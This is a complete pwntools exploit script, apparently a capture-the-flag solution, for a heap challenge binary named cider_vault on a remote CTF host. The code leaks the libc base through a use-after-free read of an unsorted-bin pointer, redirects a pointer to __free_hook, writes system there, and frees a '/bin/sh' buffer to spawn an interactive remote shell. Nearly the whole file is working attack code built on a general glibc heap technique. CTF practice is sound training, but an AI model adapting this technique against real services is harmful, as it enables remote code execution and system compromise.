#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = "chals.bitskrieg.in"
PORT = 42567

elf = ELF("./cider_vault")
libc = ELF("./libc.so.6")

XOR_KEY = 0x51F0D1CE6E5B7A91

def choose(n):
    r.sendlineafter(b"> \n", str(n).encode())

def open_page(idx, size):
    choose(1)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    r.sendlineafter(b"page size:\n", str(size).encode())

def paint_page(idx, nbytes, data):
    choose(2)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    r.sendlineafter(b"ink bytes:\n", str(nbytes).encode())
    r.recvuntil(b"ink:\n")
    # read() loop expects exactly nbytes raw bytes
    r.send(data.ljust(nbytes, b'\x00'))

def peek_page(idx, nbytes):
    choose(3)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    r.sendlineafter(b"peek bytes:\n", str(nbytes).encode())
    data = r.recvn(nbytes)
    return data

def tear_page(idx):
    choose(4)
    r.sendlineafter(b"page id:\n", str(idx).encode())

def whisper_path(idx, target_addr):
    choose(6)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    # whisper sets ptr = user_input XOR key
    token = target_addr ^ XOR_KEY
    # strtol parses signed long; handle unsigned > LONG_MAX
    if token >= (1 << 63):
        token -= (1 << 64)
    r.sendlineafter(b"star token:\n", str(token).encode())

# ---- Connect ----
r = remote(HOST, PORT)

# ---- Step 1: Allocate chunks ----
# 0x420 -> chunk size 0x430, too big for tcache -> unsorted bin on free
open_page(0, 0x420)
# Guard chunk prevents consolidation with top chunk
open_page(1, 0x80)

# ---- Step 2: Free chunk 0 -> unsorted bin (UAF: ptr not cleared) ----
tear_page(0)

# ---- Step 3: Leak libc via unsorted bin fd ----
leak_data = peek_page(0, 8)
libc_leak = u64(leak_data)
log.info(f"Leaked unsorted bin fd: {hex(libc_leak)}")

# Sanity check: should look like 0x7f............
assert (libc_leak >> 40) == 0x7f or (libc_leak >> 40) == 0x7e, \
    f"Leak looks wrong: {hex(libc_leak)}"

# leaked = main_arena + 96 (0x60)
# main_arena = __malloc_hook + 0x10
libc.address = libc_leak - libc.sym.__malloc_hook - 0x70
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system:      {hex(libc.sym.system)}")
log.info(f"__free_hook: {hex(libc.sym.__free_hook)}")

# Sanity: libc base should be page-aligned
assert (libc.address & 0xfff) == 0, \
    f"libc base not page-aligned: {hex(libc.address)}"

# ---- Step 4: Overwrite __free_hook with system ----
# Use whisper to redirect slot 1's pointer to __free_hook
whisper_path(1, libc.sym.__free_hook)

# Write system address into __free_hook
paint_page(1, 8, p64(libc.sym.system))
log.success("__free_hook overwritten with system!")

# ---- Step 5: Trigger system("/bin/sh") ----
open_page(2, 0x80)
paint_page(2, 8, b"/bin/sh\x00")
log.info("Triggering free -> system('/bin/sh')...")
tear_page(2)

# ---- Shell ----
r.interactive()
